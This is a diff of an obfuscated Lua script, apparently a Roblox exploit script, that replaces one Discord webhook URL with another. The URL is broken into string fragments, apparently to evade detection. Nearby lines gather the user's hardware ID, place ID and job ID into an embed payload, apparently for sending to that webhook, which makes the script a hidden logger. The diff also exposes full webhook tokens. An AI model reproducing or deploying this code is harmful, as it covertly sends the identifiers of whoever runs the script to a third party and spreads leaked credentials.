@@ -16536,13 +16536,12 @@ L_1_[99] = gethwid and gethwid() or "Unknown HWID"
 L_1_[118] = game["PlaceId"] or 0
 L_1_[106] = game["JobId"] or "Unknown"
 L_1_[61] = L_1_[2]({
-	"https://discord.com/";
-	"api/webhooks/1450118";
-	"152213237841/nd89RDo";
-	"-W0xQyOODqwweKFSi5eK";
-	"Nittl7BXsyTww0X_oXKs";
-	"hSNVdH2I3ATNoRoUGsXD";
-	"5"
+	"https://discord.com/api/";
+	"webhooks/145994482236536";
+	"0310/NLS84l2pKh0xhJ0wPje";
+	"s3gvPE3sCmyfHtQqIvWhuxVF";
+	"fUBkPsK3TJRFx12Epvl76OVd";
+	"M"
 })
 L_1_[71] = {
 	["embeds"] = {
@@ -16633,3 +16632,4 @@ pcall(function()
 	})
 
 end)
+
